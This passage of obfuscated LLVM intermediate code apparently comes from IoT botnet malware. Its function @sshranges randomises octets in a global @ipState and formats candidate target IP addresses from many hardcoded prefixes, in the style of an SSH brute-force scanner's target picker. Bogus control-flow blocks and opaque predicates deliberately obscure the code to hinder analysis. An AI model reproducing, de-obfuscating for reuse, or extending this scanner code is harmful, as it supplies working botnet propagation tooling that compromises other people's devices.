  %2399 = zext i8 %2398 to i32
  %2400 = call i32 (i8*, i8*, ...) @szprintf(i8* %2395, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.556, i32 0, i32 0), i32 %2397, i32 %2399)
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %732
  %2401 = load i32, i32* %1, align 4
  %2402 = icmp eq i32 %2401, 38
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %751
  %2403 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2404 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2405 = zext i8 %2404 to i32
  %2406 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2407 = zext i8 %2406 to i32
  %2408 = call i32 (i8*, i8*, ...) @szprintf(i8* %2403, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.562, i32 0, i32 0), i32 %2405, i32 %2407)
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %774
  %2409 = load i32, i32* %1, align 4
  %2410 = icmp eq i32 %2409, 39
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %820
  %2411 = load i32, i32* %1, align 4
  %2412 = icmp eq i32 %2411, 42
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %839
  %2413 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2414 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2415 = zext i8 %2414 to i32
  %2416 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2417 = zext i8 %2416 to i32
  %2418 = call i32 (i8*, i8*, ...) @szprintf(i8* %2413, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.566, i32 0, i32 0), i32 %2415, i32 %2417)
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %865
  %2419 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2420 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2421 = zext i8 %2420 to i32
  %2422 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2423 = zext i8 %2422 to i32
  %2424 = call i32 (i8*, i8*, ...) @szprintf(i8* %2419, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.567, i32 0, i32 0), i32 %2421, i32 %2423)
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %891
  %2425 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2426 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2427 = zext i8 %2426 to i32
  %2428 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2429 = zext i8 %2428 to i32
  %2430 = call i32 (i8*, i8*, ...) @szprintf(i8* %2425, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.568, i32 0, i32 0), i32 %2427, i32 %2429)
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %917
  %2431 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2432 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2433 = zext i8 %2432 to i32
  %2434 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2435 = zext i8 %2434 to i32
  %2436 = call i32 (i8*, i8*, ...) @szprintf(i8* %2431, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.569, i32 0, i32 0), i32 %2433, i32 %2435)
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %940
  %2437 = load i32, i32* %1, align 4
  %2438 = icmp eq i32 %2437, 46
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %966
  %2439 = load i32, i32* %1, align 4
  %2440 = icmp eq i32 %2439, 47
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %995
  %2441 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2442 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2443 = zext i8 %2442 to i32
  %2444 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2445 = zext i8 %2444 to i32
  %2446 = call i32 (i8*, i8*, ...) @szprintf(i8* %2441, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.572, i32 0, i32 0), i32 %2443, i32 %2445)
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1018
  %2447 = load i32, i32* %1, align 4
  %2448 = icmp eq i32 %2447, 49
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1037
  %2449 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2450 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2451 = zext i8 %2450 to i32
  %2452 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2453 = zext i8 %2452 to i32
  %2454 = call i32 (i8*, i8*, ...) @szprintf(i8* %2449, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.573, i32 0, i32 0), i32 %2451, i32 %2453)
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1060
  %2455 = load i32, i32* %1, align 4
  %2456 = icmp eq i32 %2455, 50
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1079
  %2457 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2458 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2459 = zext i8 %2458 to i32
  %2460 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2461 = zext i8 %2460 to i32
  %2462 = call i32 (i8*, i8*, ...) @szprintf(i8* %2457, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.574, i32 0, i32 0), i32 %2459, i32 %2461)
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1105
  %2463 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2464 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2465 = zext i8 %2464 to i32
  %2466 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2467 = zext i8 %2466 to i32
  %2468 = call i32 (i8*, i8*, ...) @szprintf(i8* %2463, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.540, i32 0, i32 0), i32 %2465, i32 %2467)
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1148
  %2469 = load i32, i32* %1, align 4
  %2470 = icmp eq i32 %2469, 54
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1194
  %2471 = load i32, i32* %1, align 4
  %2472 = icmp eq i32 %2471, 57
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1233
  %2473 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2474 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2475 = zext i8 %2474 to i32
  %2476 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2477 = zext i8 %2476 to i32
  %2478 = call i32 (i8*, i8*, ...) @szprintf(i8* %2473, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.582, i32 0, i32 0), i32 %2475, i32 %2477)
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1259
  %2479 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2480 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2481 = zext i8 %2480 to i32
  %2482 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2483 = zext i8 %2482 to i32
  %2484 = call i32 (i8*, i8*, ...) @szprintf(i8* %2479, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.583, i32 0, i32 0), i32 %2481, i32 %2483)
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1322
  %2485 = load i32, i32* %1, align 4
  %2486 = icmp eq i32 %2485, 65
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1341
  %2487 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2488 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2489 = zext i8 %2488 to i32
  %2490 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2491 = zext i8 %2490 to i32
  %2492 = call i32 (i8*, i8*, ...) @szprintf(i8* %2487, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.588, i32 0, i32 0), i32 %2489, i32 %2491)
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1364
  %2493 = load i32, i32* %1, align 4
  %2494 = icmp eq i32 %2493, 66
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1400
  %2495 = load i32, i32* %1, align 4
  %2496 = icmp eq i32 %2495, 68
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1419
  %2497 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2498 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2499 = zext i8 %2498 to i32
  %2500 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2501 = zext i8 %2500 to i32
  %2502 = call i32 (i8*, i8*, ...) @szprintf(i8* %2497, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.591, i32 0, i32 0), i32 %2499, i32 %2501)
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1465
  %2503 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2504 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2505 = zext i8 %2504 to i32
  %2506 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2507 = zext i8 %2506 to i32
  %2508 = call i32 (i8*, i8*, ...) @szprintf(i8* %2503, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.594, i32 0, i32 0), i32 %2505, i32 %2507)
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1488
  %2509 = load i32, i32* %1, align 4
  %2510 = icmp eq i32 %2509, 72
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1524
  %2511 = load i32, i32* %1, align 4
  %2512 = icmp eq i32 %2511, 74
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1560
  %2513 = load i32, i32* %1, align 4
  %2514 = icmp eq i32 %2513, 76
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1596
  %2515 = load i32, i32* %1, align 4
  %2516 = icmp eq i32 %2515, 78
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1645
  %2517 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2518 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2519 = zext i8 %2518 to i32
  %2520 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2521 = zext i8 %2520 to i32
  %2522 = call i32 (i8*, i8*, ...) @szprintf(i8* %2517, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.604, i32 0, i32 0), i32 %2519, i32 %2521)
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1691
  %2523 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2524 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2525 = zext i8 %2524 to i32
  %2526 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2527 = zext i8 %2526 to i32
  %2528 = call i32 (i8*, i8*, ...) @szprintf(i8* %2523, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.607, i32 0, i32 0), i32 %2525, i32 %2527)
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1734
  %2529 = load i32, i32* %1, align 4
  %2530 = icmp eq i32 %2529, 87
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1763
  %2531 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2532 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2533 = zext i8 %2532 to i32
  %2534 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2535 = zext i8 %2534 to i32
  %2536 = call i32 (i8*, i8*, ...) @szprintf(i8* %2531, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.611, i32 0, i32 0), i32 %2533, i32 %2535)
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1786
  %2537 = load i32, i32* %1, align 4
  %2538 = icmp eq i32 %2537, 89
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1805
  %2539 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2540 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2541 = zext i8 %2540 to i32
  %2542 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2543 = zext i8 %2542 to i32
  %2544 = call i32 (i8*, i8*, ...) @szprintf(i8* %2539, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.612, i32 0, i32 0), i32 %2541, i32 %2543)
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1848
  %2545 = load i32, i32* %1, align 4
  %2546 = icmp eq i32 %2545, 92
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1867
  %2547 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2548 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2549 = zext i8 %2548 to i32
  %2550 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2551 = zext i8 %2550 to i32
  %2552 = call i32 (i8*, i8*, ...) @szprintf(i8* %2547, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.615, i32 0, i32 0), i32 %2549, i32 %2551)
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1893
  %2553 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2554 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2555 = zext i8 %2554 to i32
  %2556 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2557 = zext i8 %2556 to i32
  %2558 = call i32 (i8*, i8*, ...) @szprintf(i8* %2553, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.616, i32 0, i32 0), i32 %2555, i32 %2557)
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1916
  %2559 = load i32, i32* %1, align 4
  %2560 = icmp eq i32 %2559, 94
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1942
  %2561 = load i32, i32* %1, align 4
  %2562 = icmp eq i32 %2561, 95
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1978
  %2563 = load i32, i32* %1, align 4
  %2564 = icmp eq i32 %2563, 97
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %2004
  %2565 = load i32, i32* %1, align 4
  %2566 = icmp eq i32 %2565, 98
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %2023
  %2567 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2568 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2569 = zext i8 %2568 to i32
  %2570 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2571 = zext i8 %2570 to i32
  %2572 = call i32 (i8*, i8*, ...) @szprintf(i8* %2567, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.621, i32 0, i32 0), i32 %2569, i32 %2571)
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %2109
  %2573 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2574 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2575 = zext i8 %2574 to i32
  %2576 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2577 = zext i8 %2576 to i32
  %2578 = call i32 (i8*, i8*, ...) @szprintf(i8* %2573, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.628, i32 0, i32 0), i32 %2575, i32 %2577)
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %2165
  %2579 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2580 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2581 = zext i8 %2580 to i32
  %2582 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2583 = zext i8 %2582 to i32
  %2584 = call i32 (i8*, i8*, ...) @szprintf(i8* %2579, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.632, i32 0, i32 0), i32 %2581, i32 %2583)
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %2248
  %2585 = load i32, i32* %1, align 4
  %2586 = icmp eq i32 %2585, 116
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %2267
  %2587 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2588 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2589 = zext i8 %2588 to i32
  %2590 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2591 = zext i8 %2590 to i32
  %2592 = call i32 (i8*, i8*, ...) @szprintf(i8* %2587, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.639, i32 0, i32 0), i32 %2589, i32 %2591)
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2293
  %2593 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2594 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2595 = zext i8 %2594 to i32
  %2596 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2597 = zext i8 %2596 to i32
  %2598 = call i32 (i8*, i8*, ...) @szprintf(i8* %2593, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.640, i32 0, i32 0), i32 %2595, i32 %2597)
  br label %originalBB274
}

; Function Attrs: noinline nounwind uwtable
define i32 @sshranges() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 40
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %26

; <label>:19:                                     ; preds = %0
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %22 = zext i8 %21 to i32
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = call i32 (i8*, i8*, ...) @szprintf(i8* %20, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.641, i32 0, i32 0), i32 %22, i32 %24)
  br label %26

; <label>:26:                                     ; preds = %19, %0
  %27 = load i32, i32* %1, align 4
  %28 = icmp eq i32 %27, 1
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 (i8*, i8*, ...) @szprintf(i8* %30, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.642, i32 0, i32 0), i32 %32, i32 %34)
  br label %36

; <label>:36:                                     ; preds = %29, %26
  %37 = load i32, i32* %1, align 4
  %38 = icmp eq i32 %37, 2
  br i1 %38, label %39, label %62

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* @x.63
  %41 = load i32, i32* @y.64
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %49 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %52 = zext i8 %51 to i32
  %53 = call i32 (i8*, i8*, ...) @szprintf(i8* %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.643, i32 0, i32 0), i32 %50, i32 %52)
  %54 = load i32, i32* @x.63
  %55 = load i32, i32* @y.64
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %36
  %63 = load i32, i32* %1, align 4
  %64 = icmp eq i32 %63, 3
  br i1 %64, label %65, label %88

; <label>:65:                                     ; preds = %62
  %66 = load i32, i32* @x.63
  %67 = load i32, i32* @y.64
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %75 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %76 = zext i8 %75 to i32
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %78 = zext i8 %77 to i32
  %79 = call i32 (i8*, i8*, ...) @szprintf(i8* %74, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.644, i32 0, i32 0), i32 %76, i32 %78)
  %80 = load i32, i32* @x.63
  %81 = load i32, i32* @y.64
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %88

; <label>:88:                                     ; preds = %originalBBpart24, %62
  %89 = load i32, i32* %1, align 4
  %90 = icmp eq i32 %89, 4
  br i1 %90, label %91, label %114

; <label>:91:                                     ; preds = %88
  %92 = load i32, i32* @x.63
  %93 = load i32, i32* @y.64
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %102 = zext i8 %101 to i32
  %103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %104 = zext i8 %103 to i32
  %105 = call i32 (i8*, i8*, ...) @szprintf(i8* %100, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.645, i32 0, i32 0), i32 %102, i32 %104)
  %106 = load i32, i32* @x.63
  %107 = load i32, i32* @y.64
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %114

; <label>:114:                                    ; preds = %originalBBpart28, %88
  %115 = load i32, i32* %1, align 4
  %116 = icmp eq i32 %115, 5
  br i1 %116, label %117, label %124

; <label>:117:                                    ; preds = %114
  %118 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %119 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %120 = zext i8 %119 to i32
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %122 = zext i8 %121 to i32
  %123 = call i32 (i8*, i8*, ...) @szprintf(i8* %118, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.646, i32 0, i32 0), i32 %120, i32 %122)
  br label %124

; <label>:124:                                    ; preds = %117, %114
  %125 = load i32, i32* %1, align 4
  %126 = icmp eq i32 %125, 6
  br i1 %126, label %127, label %150

; <label>:127:                                    ; preds = %124
  %128 = load i32, i32* @x.63
  %129 = load i32, i32* @y.64
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %127
  %136 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %138 = zext i8 %137 to i32
  %139 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %140 = zext i8 %139 to i32
  %141 = call i32 (i8*, i8*, ...) @szprintf(i8* %136, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.647, i32 0, i32 0), i32 %138, i32 %140)
  %142 = load i32, i32* @x.63
  %143 = load i32, i32* @y.64
